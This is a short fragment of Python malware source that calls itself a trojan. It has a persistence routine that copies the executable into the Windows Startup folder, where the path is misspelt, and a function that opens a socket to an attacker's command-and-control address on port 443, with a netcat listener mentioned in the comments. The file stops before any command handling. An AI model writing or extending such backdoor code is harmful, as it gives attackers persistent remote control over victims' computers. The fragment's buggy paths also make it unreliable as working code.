import socket 
import subprocess
import threading
import time 
import os 

#variables to get ip adress using natcat 
#listen for connections to come in

CCIP = ''
CCPORT = 443  #SSL CONNECTION 

#out run the script/trojan to keep running

def autorun():
    filen = os.path.basename(__file__)
    exe_file = filen.replace('.py', '.exe')
    os.system('copy {} "\\%APPDATA%\\Microsoft\\Windows\\Start Menu\\Porgrams\\Startup"'.format(exe_file))
    
#connection Funciton for ip and port

def conn(CCIP, CCPORT):
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((CCIP, CCPORT))
        return client
    
    except Exception as error:
        print(error)


#checks for error if fails